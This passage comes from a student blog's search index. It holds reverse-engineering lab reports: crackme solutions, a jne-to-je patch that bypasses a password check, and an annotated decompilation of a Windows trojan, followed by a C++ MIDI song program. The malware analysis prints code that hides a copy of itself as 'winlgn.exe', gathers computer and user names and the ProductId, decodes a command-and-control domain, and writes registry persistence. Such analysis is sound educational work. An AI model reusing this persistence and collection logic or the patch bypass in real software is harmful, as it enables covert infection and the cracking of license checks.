&lt;= local_80) break;    local_7c[local_80] = param_1[local_80] + -3;    local_80 = local_80 + 1;  &#125;  local_7c[local_80] = &#x27;\\0&#x27;;  printf(&quot;%s\\n&quot;,local_7c);  return;&#125;\n\nshift2 伪代码titlevoid shift(char *param_1)&#123;  size_t sVar1;  uint local_80;  char local_7c [120];  local_80 = 0;  while( true ) &#123;    sVar1 = strlen(param_1);    if (sVar1 &lt;= local_80) break;    local_7c[local_80] = param_1[local_80] + -3;    local_80 = local_80 + 1;  &#125;  local_7c[local_80] = &#x27;\\0&#x27;;  printf(&quot;%s\\n&quot;,local_7c);  return;&#125;\n\n通过分析伪代码,主函数接受用户输入一个数，然后进入 test 函数，参数是输入的数和另一个十六进制数\n十六进制数为：0x52b24转换为二进制为：0b1010010101100100100转换为八进制为：0o1225444转换为十进制为：338724\n进入 test 函数之后可以看到如果两个参数相等，则调用函数第一个shift1，否则调用函数第二个shift2\nshift1 函数携带参数为字符串Sdvvzrug#RN$$$#=,，shift2 函数携带参数为字符串Lqydolg#Sdvvzrug$\nshift1 函数的作用是将传入的字符串中的每个字符的 ASCII 码值减去 3，然后将结果打印出来。\nshift2 函数的作用同上\n编写脚本解密\na=&quot;Sdvvzrug#RN$$$#=,&quot;aa=&quot;&quot;b=&quot;Lqydolg#Sdvvzrug$&quot;bb=&quot;&quot;for i in range(len(a)):    aa+=chr(ord(a[i])-3)    bb+=chr(ord(b[i])-3)print(aa)print(bb)\n\n解密结果是Password OK!!! :)Invalid Password!\n\nI_have_g0t_it_n0w!\n\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告7","url":"/posts/f579b246.html","content":"汇编语言与逆向工程实验报告 7文件信息首先看一下文件信息\n\n可以看到是 32 位程序\n静态分析定位到关键函数\nint __cdecl check(char *Str)&#123;  char Buffer; // [esp+1Bh] [ebp-Dh] BYREF  size_t i; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h]  int v5; // [esp+24h] [ebp-4h] BYREF  v4 = 0;  for ( i = 0; i &lt; strlen(Str); ++i )  &#123;    Buffer = Str[i];    sscanf(&amp;Buffer, &quot;%d&quot;, &amp;v5);    v4 += v5;    if ( v4 == 15 )    &#123;      printf(&quot;Password OK!\\n&quot;);      exit(0);    &#125;  &#125;  return printf(&quot;Password Incorrect!\\n&quot;);&#125;\n\n可以看到函数 check 接收一个字符串 Str 作为参数，然后循环遍历字符串，将每个字符转换为整数，并累加到变量 v4 中。如果 v4 等于 15，则打印 Password OK! 并退出程序，否则打印 Password Incorrect! 并返回。\n动态调试找到 password ok 字符串\n\n函数改成 jne 改成 je，意思就是把原来的输出错误的条件改成输出正确的条件，这样就会一直输出 OK\n\n打补丁导出\n\n实现任意输入都输出 password ok\n\n相关链接\n[原创]x64dbg 使用记录：开始调试并修改一个程序\nx64dbg 入门系列（二）-搜索字符串\n[x64dbg] 实战 01 - 参数打印&#x2F;修改参数内容（条件断点、命令、脚本）\nx32dbg&#x2F;x64dbg 修改后如何保存到 exe\nx86 汇编JE、JNE、JCXZ 和 JECXZ 指令笔记_34\n\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告8","url":"/posts/65c6afd7.html","content":"在线浏览: https://blog.w1ndys.top/posts/65c6afd7\n主函数int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v3; // ebx  int v4; // ebx  char v6[80]; // [rsp+10h] [rbp-50h] BYREF  printf(&quot;Whats the password: &quot;);  __isoc99_scanf(&quot;%s&quot;, v6);  v3 = check1(v6);  v4 = check2(v6) * v3;  if ( (int)(v4 * check3(v6)) &lt;= 0 )    puts(&quot;Nope, try again.&quot;);  else    puts(&quot;Correct!&quot;);  return 0;&#125;\n\ncheck1()__int64 __fastcall check1(const char *a1)&#123;  int i; // [rsp+1Ch] [rbp-14h]  for ( i = 0; i &lt; strlen(a1); ++i )  &#123;    if ( a1[i] &lt;= 47 || a1[i] &gt; 57 )      return 0LL;  &#125;  return 1LL;&#125;\n\n\ncheck1() 函数检查输入的密码是否全部为数字。\ncheck2()__int64 __fastcall check2(const char *a1)&#123;  char v2; // [rsp+18h] [rbp-18h]  int i; // [rsp+1Ch] [rbp-14h]  v2 = 0;  for ( i = 0; i &lt; strlen(a1) - 1; ++i )    v2 += a1[i];  if ( (v2 &amp; 1) != 0 )    return 0xFFFFFFFFLL;  else    return 1LL;&#125;\n\n\ncheck2() 函数检查输入的密码，除去最后一位之后前面的和是不是偶数。\ncheck3()__int64 __fastcall check3(const char *a1)&#123;  int v2; // ebx  int i; // [rsp+1Ch] [rbp-14h]  if ( (strlen(a1) &amp; 1) != 0 || strlen(a1) &lt;= 4 )    return 0LL;  for ( i = 0; i &lt; strlen(a1) &gt;&gt; 1; ++i )  &#123;    v2 = a1[i];    if ( v2 != a1[i + (strlen(a1) &gt;&gt; 1)] + 4 )      return 0LL;  &#125;  return 1LL;&#125;\n\n\ncheck3() 函数检查输入的密码，前半部分是否等于后半部分加 4。\n总结本次实验中，我们实现了三个密码检查函数，分别是 check1()、check2() 和 check3()。check1() 函数检查输入的密码是否全部为数字，check2() 函数检查输入的密码，除去最后一位之后前面的和是不是偶数，check3() 函数检查输入的密码，前半部分是否等于后半部分加 4。\n所以输入密码符合前面提到的三个情况即可\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告9 && 期中测验","url":"/posts/b681040b.html","content":"逆向病毒文件基础信息\n\n\n属性\n值\n\n\n\ncrc32\n8C1CE91C\n\n\nmd5\n73c297f059dd94671ca4e4c7dbfa6241\n\n\nsha1\nf9d5e6003715fbe3ccdf78a8bef866ebc876c85f\n\n\nsha256\ndcb8531b0879d46949dd63b1ac094f5588c26867805d0795e244f4f9b8077ed1\n\n\nsha512\n48db5c5b73bd824bf2ec3b398aea73c6ec93f519efcdc1528d8a91f32dcdbb428f539e6cb031416c8a2f551ec089993dd71a8bdae6530dd82bd4293e759dd402\n\n\nssdeep\n1536:rUUBxlaaqYV&#x2F;VnvjIM3S9r8DzeEn5gairxh:DMbYkgjn5Qrf\n\n\ntype\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\n主函数// WinMain 入口函数int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)&#123;  HWND Window; // 窗口句柄  HWND v5; // 加速器句柄  HACCEL AcceleratorsA; // 加速器表  void *v7; // 内存分配指针  void *v8; // 用于释放内存的指针  struct tagMSG Msg; // 消息结构体  // 加载窗口名称和类名  LoadStringA(hInstance, 0x67u, WindowName, 100);  LoadStringA(hInstance, 0x6Du, ClassName, 100);  // 执行某些初始化或设置操作  sub_402920();  // 将全局 hInstance 设置为传入的 hInstance  ::hInstance = hInstance;  // 创建窗口  Window = CreateWindowExA(0, ClassName, WindowName, 0xCF0000u, 0x80000000, 0, 0x80000000, 0, 0, 0, hInstance, 0);  v5 = Window;  // 如果窗口创建失败，则返回 0  if (!Window)    return 0;  // 显示窗口  ShowWindow(Window, 0);  // 更新窗口  UpdateWindow(v5);  // 加载加速器表  AcceleratorsA = LoadAcceleratorsA(hInstance, (LPCSTR)0x6D);  // 分配一块内存，但立即释放  v7 = malloc(0x5F5E100u);  v8 = v7;  if (v7)  &#123;    memset(v7, 0, 0x5F5E100u);    free(v8);    // 执行某些清理操作    sub_401130();  &#125;  // 进入消息循环  while (GetMessageA(&amp;Msg, 0, 0, 0))  &#123;    // 如果消息是加速器消息，则翻译并执行对应的命令    if (!TranslateAcceleratorA(Msg.hwnd, AcceleratorsA, &amp;Msg))    &#123;      // 否则，将消息转换为字符消息，并分派给窗口过程函数处理      TranslateMessage(&amp;Msg);      DispatchMessageA(&amp;Msg);    &#125;  &#125;  // 返回退出码  return Msg.wParam;&#125;\n\nsub_402920// 注册窗口类的函数// Parameters://   a1: 实例句柄，用于标识应用程序的实例// Returns://   注册窗口类的原子值ATOM __usercall sub_402920@(HINSTANCE a1)&#123;  // 定义一个窗口类结构体变量  WNDCLASSEXA v2; // [esp+4h] [ebp-30h] BYREF  // 设置结构体的大小  v2.cbSize = 48;  // 设置窗口类的样式  v2.style = 3;  // 设置窗口过程函数指针  v2.lpfnWndProc = sub_4029B0;  // 设置额外的类空间  v2.cbClsExtra = 0;  // 设置额外的窗口空间  v2.cbWndExtra = 0;  // 设置窗口类所属的实例句柄  v2.hInstance = a1;  // 加载大图标资源  v2.hIcon = LoadIconA(a1, (LPCSTR)0x6B);  // 加载光标资源  v2.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);  // 设置窗口背景画刷句柄  v2.hbrBackground = (HBRUSH)6;  // 设置菜单资源的 ID  v2.lpszMenuName = (LPCSTR)109;  // 设置窗口类名  v2.lpszClassName = ClassName;  // 加载小图标资源  v2.hIconSm = LoadIconA(v2.hInstance, (LPCSTR)0x6C);  // 注册窗口类并返回结果  return RegisterClassExA(&amp;v2);&#125;\n\n这个函数注册了一个窗口\n\n下面再分析一下窗口过程函数\n\nsub_4029B0// 处理窗口消息的回调函数LRESULT __stdcall sub_4029B0(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)&#123;  struct tagPAINTSTRUCT Paint; // 绘制结构体  // 如果消息类型小于等于0xF，处理基本的系统消息  if ( Msg &lt;= 0xF )  &#123;    switch ( Msg )    &#123;      // 处理窗口重绘消息      case 0xFu:        BeginPaint(hWnd, &amp;Paint); // 开始绘制        EndPaint(hWnd, &amp;Paint); // 结束绘制        return 0; // 消息已处理，返回0      // 处理定时器消息      case 1u:        SetTimer(hWnd, 1u, 0x1770u, TimerFunc); // 设置定时器        return 0; // 消息已处理，返回0      // 处理窗口关闭消息      case 2u:        PostQuitMessage(0); // 通知应用程序退出        return 0; // 消息已处理，返回0    &#125;    return DefWindowProcA(hWnd, Msg, wParam, lParam); // 其他基本系统消息，调用默认处理函数  &#125;  // 如果消息类型大于0xF，处理自定义应用程序消息  if ( Msg != 273 ) // 检查是否是自定义消息    return DefWindowProcA(hWnd, Msg, wParam, lParam); // 不是自定义消息，调用默认处理函数  if ( (unsigned __int16)wParam == 104 ) // 自定义消息值为104  &#123;    DialogBoxParamA(hInstance, (LPCSTR)0x67, hWnd, DialogFunc, 0); // 弹出对话框    return 0; // 消息已处理，返回0  &#125;  else if ( (unsigned __int16)wParam == 105 ) // 自定义消息值为105  &#123;    DestroyWindow(hWnd); // 销毁窗口    return 0; // 消息已处理，返回0  &#125;  else  &#123;    return DefWindowProcA(hWnd, 0x111u, wParam, lParam); // 其他自定义消息，调用默认处理函数  &#125;&#125;\n\nsub_401130这个函数是用来创建隐藏目录并复制一些文件\nint sub_401130()&#123;  int v0; // eax  char v1; // cl  const char *v2; // eax  int v3; // ecx  char v4; // dl  CHAR *v5; // eax  int v6; // ecx  CHAR *v7; // edx  BYTE *v8; // ecx  CHAR *v9; // eax  bool v10; // cf  unsigned __int8 v11; // dl  int v12; // eax  // 创建一个名称为&#x27;Path&#x27;的目录  _mkdir((const char *)Path);  // 将目录的文件属性设置为&#x27;2u&#x27;  SetFileAttributesA((LPCSTR)Path, 2u);  // 将&#x27;Path&#x27;中的每个字符复制到&#x27;byte_413298&#x27;中，直到遇到空终止符  v0 = 0;  do  &#123;    v1 = Path[v0];    byte_413298[v0++] = v1;  &#125;  while ( v1 );  // 获取一个字符串&quot;oDbdi&quot;并将其存储在&#x27;v2&#x27;中  v2 = sub_4026E0(&quot;oDbdi&quot;, 1);                                                // nCach  // 将&quot;\\\\&quot;附加到&#x27;Path&#x27;末尾  *(_WORD *)&amp;Path[strlen((const char *)Path)] = &#x27;\\\\&#x27;;  // 将&quot;\\\\&quot;附加到&#x27;byte_413298&#x27;末尾  *(_WORD *)&amp;byte_413298[strlen(byte_413298)] = &#x27;\\\\&#x27;;  // 将&#x27;byte_413298&#x27;中的每个字符复制到&#x27;byte_4133A0&#x27;中，直到遇到空终止符  v3 = 0;  do  &#123;    v4 = byte_413298[v3];    byte_4133A0[v3++] = v4;  &#125;  while ( v4 );  // 将存储在&#x27;v2&#x27;中的字符串连接到&#x27;byte_4133A0&#x27;中  strcat(byte_4133A0, v2);  // 将字符串&quot;xjomho/fyf&quot;连接到&#x27;Path&#x27;中  strcat((char *)Path, sub_4026E0(&quot;xjomho/fyf&quot;, 1));                                       // winlgn.exe   // 这个是木马创建的文件  // 调用函数sub_401740()  sub_401740();  // 获取当前模块的文件名并将其存储在&#x27;Filename&#x27;中  GetModuleFileNameA(0, Filename, 0x104u);  // 如果文件名与&#x27;Path&#x27;不同，并且无法以只读模式打开文件，则调用sub_402740()  if ( strcmp(Filename, (const char *)Path) &amp;&amp; !fopen((const char *)Path, &quot;rb&quot;) )    sub_402740();  // 当WSAStartup()返回非零值时，持续睡眠  while ( WSAStartup(0x202u, &amp;stru_412D00) )    Sleep(0x1388u);  // 初始化pHints结构体的一些成员  pHints.ai_flags = 0;  pHints.ai_addrlen = 0;  pHints.ai_canonname = 0;  pHints.ai_addr = 0;  pHints.ai_next = 0;  pHints.ai_family = 0;  pHints.ai_socktype = 1;  pHints.ai_protocol = 6;  // 获取一个字符串&quot;pomjofkpiomjof::/psh&quot;并将其存储在&#x27;v5&#x27;中  v5 = sub_4026E0(&quot;pomjofkpiomjof::/psh&quot;, 1);                                                 // onlinejohnline99.org  v7 = pNodeName;  do  &#123;    LOBYTE(v6) = *v5;    *v7++ = *v5++;  &#125;  while ( (_BYTE)v6 );  // 调用函数sub_401570()，传入参数v6和v7  sub_401570(v6, v7);  // 用循环比较&#x27;Path&#x27;和&#x27;Filename&#x27;中的字符，直到出现不相等的字符或遇到空终止符为止  v8 = Path;  v9 = Filename;  while ( 1 )  &#123;    v10 = (unsigned __int8)*v9 &lt; *v8;    if ( *v9 != *v8 )      break;    if ( !*v9 )      goto LABEL_17;    v11 = v9[1];    v10 = v11 &lt; v8[1];    if ( v11 != v8[1] )      break;    v9 += 2;    v8 += 2;    if ( !v11 )    &#123;LABEL_17:      v12 = 0;      goto LABEL_19;    &#125;  &#125;  // 如果循环结束时v12为非零值，则调用sub_401360(v8)  v12 = -v10 - (v10 - 1);LABEL_19:  if ( v12 )    sub_401360(v8);  return 0;&#125;\n\n该函数的主要作用是在指定目录下创建一个隐藏目录，并将一些文件复制到该目录中，然后比较当前模块的文件路径与指定路径，如果不同，则执行一些额外的操作。\n\n下面再分析一下函数 sub_4026E0\n\nsub_4026E0这个函数是为了简单加密字符串\n_BYTE *__usercall sub_4026E0@&lt;eax&gt;(const char *a1@&lt;eax&gt;, char a2)// 定义一个函数 sub_4026E0，接受一个字符串和一个字符作为参数，用于简单加密字符串// @param a1: 输入字符串的指针// @param a2: 加密密钥字符// @return: 返回加密后字符串的指针&#123;  int v3; // 存储字符串的长度  _BYTE *v4; // 存储动态分配的内存空间的地址  _BYTE *v5; // 用于遍历加密后的字符串  const char *v6; // 用于遍历原始字符串  int v7; // 字符串的长度计数  v3 = strlen(a1); // 获取字符串长度  v4 = malloc(v3 + 1); // 动态分配内存空间，大小为字符串长度加1（用于存储结束符）  // 如果字符串长度小于等于0，直接返回空字符串  if (v3 &lt;= 0) &#123;    *v4 = 0;    return v4;  &#125; else &#123;    v5 = v4; // 初始化加密后字符串的指针    v6 = (const char *)(a1 - v4); // 获取原始字符串的起始位置    v7 = v3; // 初始化字符串的长度计数    // 对原始字符串进行简单加密操作    do &#123;      *v5 = v5[(_DWORD)v6] - a2; // 将原始字符串中的每个字符减去密钥字符      ++v5; // 移动到下一个字符位置      --v7; // 更新字符串长度计数    &#125; while (v7); // 循环直到字符串结束    v4[v3] = 0; // 在加密后字符串的末尾添加结束符    return v4; // 返回加密后字符串的指针  &#125;&#125;\n\n接受一个字符串和一个字符作为参数，然后将字符串中的每个字符减去给定的字符（密钥），从而对字符串进行加密。加密后的字符串存储在动态分配的内存空间中，并返回指向该内存空间的指针。\n实际上在这里秘钥是 1，所以加密后的字符串就是原始字符串的 ASCII 码每个字符减去 1。\n下面是等效的 Python 代码：\nwhile 1:    def decrypt_ascii_1(ciphertext, key):        plaintext = &quot;&quot;        for char in ciphertext:            decrypted_char = chr(ord(char) - key)            plaintext += decrypted_char        return plaintext    # 输入你的ASCII-1加密密文和密钥    ciphertext = input(&quot;请输入要解密的ASCII-1加密密文：&quot;)    key = 1    # 解密并输出明文    plaintext = decrypt_ascii_1(ciphertext, key)    print(&quot;解密后的明文：&quot;, plaintext)\n\n\n下面再分析一下函数 sub_401740\n\nsub_401740这个函数是为了获取计算机名、用户名\nint sub_401740()&#123;  DWORD nSize; // 存储要获取的字符串的大小  DWORD pcbData; // 存储注册表数据的大小  DWORD pcbBuffer; // 存储要获取的用户名称的大小  // 获取计算机名称，并存储在Buffer中  nSize = 255;  GetComputerNameA(Buffer, &amp;nSize);  // 获取注册表中的产品名称，并存储在unk_413AD0中  pcbData = 0x2000;  RegGetValueA(    HKEY_LOCAL_MACHINE, // 主键    &quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion&quot;, // 子键路径    &quot;ProductName&quot;, // 值名称    0xFFFFu, // 标志，指定数据类型    0, // 保留    &amp;unk_413AD0, // 存储获取的值    &amp;pcbData); // 获取的值的大小  // 获取用户名称，并存储在byte_412F90中  pcbBuffer = 255;  GetUserNameA(byte_412F90, &amp;pcbBuffer);  return 0; // 返回值&#125;\n\n该函数的主要作用是获取计算机名、用户名，并将它们保存到全局变量中。\n\n下面再分析一下函数 sub_402740\n\nsub_402740这个函数是为了复制文件\nint sub_402740()&#123;  errno_t v0; // 用于存储第一个文件打开的错误码  errno_t v1; // 用于存储第二个文件打开的错误码  int i; // 用于存储每次读取的字符  FILE *Stream; // 第一个文件的文件指针  FILE *v5; // 第二个文件的文件指针  // 尝试以只读模式打开第一个文件  v0 = fopen_s(&amp;Stream, Filename, &quot;rb&quot;);  // 尝试以写入模式打开第二个文件  v1 = fopen_s(&amp;v5, (const char *)Path, &quot;wb&quot;);  // 如果第一个文件打开失败，则返回错误码 -1  if (v0)    return -1;  // 如果第二个文件打开失败，则关闭第一个文件，并返回错误码 -1  if (v1)  &#123;    fclose(Stream);    return -1;  &#125;  // 循环读取第一个文件的内容，并将其写入到第二个文件中，直到到达文件末尾  for (i = fgetc(Stream); !feof(Stream); i = fgetc(Stream))    fputc(i, v5);  // 关闭文件流  fclose(v5);  fclose(Stream);  // 返回成功码 0  return 0;&#125;\n\n这个函数的作用是将一个文件的内容复制到另一个文件中，如果其中一个文件打开失败，则返回 -1。\n\n下面再分析一下函数 sub_401570\n\nsub_401570char *sub_401570()&#123;  unsigned int v0; // 用于存储字符串长度  BYTE *v1; // 用于存储数据的指针  HKEY phkResult; // 用于操作注册表键的句柄  DWORD cbData; // 用于存储数据的字节数  DWORD Type; // 用于存储数据的类型  BYTE Data[1024]; // 用于存储注册表数据的缓冲区  // 尝试打开注册表中的键  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion&quot;, 0, 0x101u, &amp;phkResult) )  &#123;    // 如果打开失败，则将 Buffer 和 &quot;@!&quot; 追加到 byte_4137C0 中    strcat(byte_4137C0, Buffer);    strcat(byte_4137C0, &quot;@!&quot;);    // 计算 byte_412F90 的长度并加 1    v0 = strlen(byte_412F90) + 1;    v1 = (BYTE *)byte_412F90; // 将 byte_412F90 的地址赋给 v1  &#125;  else  &#123;    // 如果成功打开注册表键，则查询 &quot;ProductId&quot; 的值并将其存储在 Data 中    cbData = 1023;    RegQueryValueExA(phkResult, &quot;ProductId&quot;, 0, &amp;Type, Data, &amp;cbData);    RegCloseKey(phkResult); // 关闭注册表键    // 将 Buffer、&quot;##&quot;、byte_412F90 和 &quot;@@&quot; 追加到 byte_4137C0 中    strcat(byte_4137C0, Buffer);    strcat(byte_4137C0, &quot;##&quot;);    strcat(byte_4137C0, byte_412F90);    strcat(byte_4137C0, &quot;@@&quot;);    v0 = strlen((const char *)Data) + 1; // 计算 Data 的长度并加 1    v1 = Data; // 将 Data 的地址赋给 v1  &#125;  // 将 v1 指向的 v0 字节的数据复制到 byte_4137C0 中  qmemcpy(&amp;byte_4137C0[strlen(byte_4137C0)], v1, v0);  return byte_4137C0; // 返回 byte_4137C0 的指针&#125;\n\n从注册表中获取 “ProductId” 值，然后将一些字符串连接起来，并返回结果。\n\n再看看 sub_401360\n\nsub_401360这个函数是为了保活\nint sub_401360()&#123;  const CHAR *v0; // 指向注册表键名的指针  const CHAR *v1; // 指向注册表值名的指针  char *v2; // 字符串缓冲区指针  HKEY phkResult; // 存储打开的注册表键的句柄  LPCSTR lpSubKey; // 存储注册表子键路径的指针  const CHAR *v6; // 指向注册表值名的指针  // 获取注册表子键路径并存储在lpSubKey中  lpSubKey = sub_4026E0(&quot;Tpguxbsf]Njdsptpgu&quot;, 1);                                       //解密之后是Software\\Microsoft  strcat((char *)lpSubKey, sub_4026E0(&quot;]Xjoepxt]Dvssfouwfstjpo]&quot;, 1));                    //解密之后是\\Windows\\Currentversion  *(_DWORD *)&amp;lpSubKey[strlen(lpSubKey)] = 7238994;  // 获取注册表值名并存储在v0中  v0 = sub_4026E0(&quot;Efgbvmu2&quot;, 1);                                                         //Default1  // 获取注册表值名并存储在v1中  v1 = sub_4026E0(&quot;TfU&quot;, 1);                                                             //Set  // 存储原始的注册表值名以备后用  v6 = v1;  // 如果注册表中没有指定的注册表值，则执行以下操作  if (RegQueryValueExA(0, v0, 0, 0, 0, 0))  &#123;    // 构建字符串并存储在v2中    v2 = sub_4026E0(&quot;dne&quot;, 1);    strcat(v2, sub_4026E0(&quot;!0d!tubsu!&amp;TfU&amp;!&quot;, 1));                                        // /c start %SeT%    strcat(v2, sub_4026E0(&quot;&#x27;&#x27;!&quot;, 1));                                                     //&amp;&amp;    strcat(v2, &quot;exit&quot;);    // 打开注册表键    RegOpenKeyExA(HKEY_CURRENT_USER, lpSubKey, 0, 0xF003Fu, &amp;phkResult);    // 设置注册表值    RegSetValueExA(phkResult, v0, 0, 1u, (const BYTE *)v2, strlen(v2));    // 关闭注册表键    RegCloseKey(phkResult);    // 恢复注册表值名为原始值    v1 = v6;  &#125;  // 如果注册表中没有指定的注册表值，则执行以下操作  if (RegQueryValueExA(0, v1, 0, 0, 0, 0))  &#123;    // 打开注册表键    RegOpenKeyExA(HKEY_CURRENT_USER, &quot;Environment&quot;, 0, 0xF003Fu, &amp;phkResult);    // 设置注册表值    RegSetValueExA(phkResult, v1, 0, 1u, Path, strlen((const char *)Path));    // 关闭注册表键    RegCloseKey(phkResult);  &#125;  return 0; // 返回值&#125;\n\n操作 Windows 注册表，为了保活，设置了一些注册表键值。\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"用C++调用MIDI演奏曲阜师范大学校歌","url":"/posts/e0155dca.html","content":"背景介绍有一天在B站上看到有大佬用c++演奏音乐，一开始还不知道是调用MIDI函数，后来百度，查CSDN才知道是用函数调用，我直接转手写一个自己学校的校歌\n前期准备首先准备好校歌的键盘，想必大家通知书上都有吧\n然后是c++编译器，我用Visual Studio 2022\n然后是一些乐理知识，由于我是一个纯工科生，对乐理知识了解程度为0，只能大体看音调，不认识节拍，无奈只能去群里找懂行的人，很巧就有一个19的师姐还一个22的同学解答了我的疑惑\n代码编写Scale函数\n这个函数是一个简谱对照表，相当于base64编码的编码表\nenum Scale&#123;    Rest = 0, C8 = 108, B7 = 107, A7s = 106, A7 = 105, G7s = 104, G7 = 103, F7s = 102, F7 = 101, E7 = 100,    D7s = 99, D7 = 98, C7s = 97, C7 = 96, B6 = 95, A6s = 94, A6 = 93, G6s = 92, G6 = 91, F6s = 90, F6 = 89,    E6 = 88, D6s = 87, D6 = 86, C6s = 85, C6 = 84, B5 = 83, A5s = 82, A5 = 81, G5s = 80, G5 = 79, F5s = 78,    F5 = 77, E5 = 76, D5s = 75, D5 = 74, C5s = 73, C5 = 72, B4 = 71, A4s = 70, A4 = 69, G4s = 68, G4 = 67,    F4s = 66, F4 = 65, E4 = 64, D4s = 63, D4 = 62, C4s = 61, C4 = 60, B3 = 59, A3s = 58, A3 = 57, G3s = 56,    G3 = 55, F3s = 54, F3 = 53, E3 = 52, D3s = 51, D3 = 50, C3s = 49, C3 = 48, B2 = 47, A2s = 46, A2 = 45,    G2s = 44, G2 = 43, F2s = 42, F2 = 41, E2 = 40, D2s = 39, D2 = 38, C2s = 37, C2 = 36, B1 = 35, A1s = 34,    A1 = 33, G1s = 32, G1 = 31, F1s = 30, F1 = 29, E1 = 28, D1s = 27, D1 = 26, C1s = 25, C1 = 24, B0 = 23,    A0s = 22, A0 = 21&#125;;\n\n然后是Voice函数，这个是控制声音的\nenum Voice&#123;    X1 = C2, X2 = D2, X3 = E2, X4 = F2, X5 = G2, X6 = A2, X7 = B2,    L1 = C3, L2 = D3, L3 = E3, L4 = F3, L5 = G3, L6 = A3, L7 = B3,    M1 = C4, M2 = D4, M3 = E4, M4 = F4, M5 = G4, M6 = A4, M7 = B4,    H1 = C5, H2 = D5, H3 = E5, H4 = F5, H5 = G5, H6 = A5, H7 = B5,    LOW_SPEED = 500, MIDDLE_SPEED = 400, HIGH_SPEED = 300,    _ = 0XFF&#125;;\n\n然后就到最核心的了，就是编谱，把简谱翻译成代码\nvoid   QFNU()&#123;    HMIDIOUT handle;    midiOutOpen(&amp;handle, 0, 0, 0, CALLBACK_NULL);    int volume = 0x7f;    int voice = 0x0;    int sleep = 300;    int QFNU[] =    &#123;         M1,_,M1,_,M1,_,M2,_,        M3,_,M5,_,M5,_,_,_,        M6,_,M6,_,M5,_,M3,_,        M1,_,M2,M3,M2,_,_,_,        M3,_,M3,_,M5,_,M5,_,        M3,_,M2,_,M1,_,L6,_,        L5,L6,M1,M2,M3,_,M5,_,        M2,_,_,_,_,_,        M1,_,M1,_,M1,_,M2,_,        M3,_,M5,_,M5,_,_,        M6,_,M6,_,M5,_,M3,_,        M1,_,M2,M3,M2,_,_,        M3,_,M3,_,M5,_,M5,_,        M3,_,M2,_,M1,_,L6,_,        L5,L6,M1,M2,M3,_,M2,_,        M1,_,_,_,_,        H1,_,H1,_,H1,_,_,_,        M3,_,M5,M6,M5,_,_,_,        M6,_,M5,_,M4,_,M1,_,        M7,_,M6,M7,M5,_,_,_,        M6,_,H1,_,H1,_,H1,_,        M3,_,M5,M6,M6,_,M6,_,        M6,M5,M4,M4,M4,_,_,_,        M2,M2,M2,M3,_,M2,_,_,_,        H1,_,H1,_,H1,_,_,_,        M3,_,M5,M6,M5,_,_,_,        M6,_,M5,_,M4,_,M1,_,        M7,_,M6,M7,M5,_,_,_,        M6,_,H1,_,H1,_,H1,_,        M3,M3,M5,M6,M6,_,_,_,        M2,M3,M5,M5,M5,M5,M5,M5,_,        H2,_,H2,_,M6,_,M7,_,        H1,H1,H1,H1,H1,H1,    &#125;;    \tfor (auto i : QFNU)    &#123;        if (i == LOW_SPEED || i == HIGH_SPEED || i == MIDDLE_SPEED)        &#123;            sleep = i;            continue;        &#125;        if (i == 0) &#123; sleep = 150; continue; &#125;        if (i == 700) &#123; Sleep(150); continue; &#125;        if (i == _)        &#123;            Sleep(300);            continue;        &#125;        voice = (volume &lt;&lt; 16) + ((i) &lt;&lt; 8) + 0x90;        midiOutShortMsg(handle, voice);        cout &lt;&lt; voice &lt;&lt; endl;        Sleep(sleep);    &#125;    midiOutClose(handle);&#125;\n\n最后用int main主函数调用就可以\nint main()&#123;    QFNU();//犁牛之子    return 0;&#125;\n\n\n\n完整代码#include&lt;iostream&gt;#include&lt;Windows.h&gt;#pragma comment(lib,&quot;winmm.lib&quot;)using namespace std;enum Scale&#123;    Rest = 0, C8 = 108, B7 = 107, A7s = 106, A7 = 105, G7s = 104, G7 = 103, F7s = 102, F7 = 101, E7 = 100,    D7s = 99, D7 = 98, C7s = 97, C7 = 96, B6 = 95, A6s = 94, A6 = 93, G6s = 92, G6 = 91, F6s = 90, F6 = 89,    E6 = 88, D6s = 87, D6 = 86, C6s = 85, C6 = 84, B5 = 83, A5s = 82, A5 = 81, G5s = 80, G5 = 79, F5s = 78,    F5 = 77, E5 = 76, D5s = 75, D5 = 74, C5s = 73, C5 = 72, B4 = 71, A4s = 70, A4 = 69, G4s = 68, G4 = 67,    F4s = 66, F4 = 65, E4 = 64, D4s = 63, D4 = 62, C4s = 61, C4 = 60, B3 = 59, A3s = 58, A3 = 57, G3s = 56,    G3 = 55, F3s = 54, F3 = 53, E3 = 52, D3s = 51, D3 = 50, C3s = 49, C3 = 48, B2 = 47, A2s = 46, A2 = 45,    G2s = 44, G2 = 43, F2s = 42, F2 = 41, E2 = 40, D2s = 39, D2 = 38, C2s = 37, C2 = 36, B1 = 35, A1s = 34,    A1 = 33, G1s = 32, G1 = 31, F1s = 30, F1 = 29, E1 = 28, D1s = 27, D1 = 26, C1s = 25, C1 = 24, B0 = 23,    A0s = 22, A0 = 21&#125;;enum Voice&#123;    X1 = C2, X2 = D2, X3 = E2, X4 = F2, X5 = G2, X6 = A2, X7 = B2,    L1 = C3, L2 = D3, L3 = E3, L4 = F3, L5 = G3, L6 = A3, L7 = B3,    M1 = C4, M2 = D4, M3 = E4, M4 = F4, M5 = G4, M6 = A4, M7 = B4,    H1 = C5, H2 = D5, H3 = E5, H4 = F5, H5 = G5, H6 = A5, H7 = B5,    LOW_SPEED = 500, MIDDLE_SPEED = 400, HIGH_SPEED = 300,    _ = 0XFF&#125;;void   QFNU()&#123;    HMIDIOUT handle;    midiOutOpen(&amp;handle, 0, 0, 0, 